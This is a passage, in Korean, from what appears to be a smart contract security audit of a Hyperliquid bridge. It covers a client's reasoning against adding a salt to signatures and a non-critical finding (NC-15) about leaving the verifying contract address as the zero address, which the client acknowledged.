> 우리는 이것이 유용한 변경이라고 생각하지 않습니다. 검증자들만이 브리지를 위해 이러한 서명을 생성하기 때문에, 우리는 이벤트가 다른 스마트 계약에서 재생되는 것에 대해 걱정할 필요가 없습니다. 또한 `byte32 salt`를 포함하면 rust 클라이언트 코드를 사용하여 서명을 생성할 때 문제가 발생합니다.

## [NC-15] 검증(Verifying) 계약 TODO

[검증 계약 주소](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L25)를 업데이트하세요.

### `f045dbf` 해결 사항

클라이언트 팀은 다음 주석과 함께 이 발견 사항을 확인(Acknowledge)했습니다:

> TODO를 제거했습니다. 검증 주소를 0 주소로 유지하는 것은 약간 혼란스럽지만 우리에게는 더 편리하며 큰 단점이 없습니다.
